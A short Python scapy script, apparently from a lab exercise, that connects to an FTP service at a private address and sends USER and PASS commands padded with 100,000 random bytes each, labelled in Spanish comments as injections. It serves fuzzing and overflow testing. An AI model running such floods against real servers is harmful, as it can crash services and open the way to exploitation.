from scapy.all import *
import random

def fuzzing():
    var = ''

    for _ in range(100000):
        n = random.randint(0, 255)
        char = chr(n)
        var = var + char
    
    return var


s = socket.socket()
s.connect(("172.17.0.2",21))
ss = StreamSocket(s,Raw)

# Inicio de sesión de usuario
ss.sr1(Raw(f"USER john_doe{fuzzing()}\r\n"))  # Primera inyección
ss.sr1(Raw(f"PASS 123{fuzzing()}\r\n"))       # Segunda inyección

s.close()
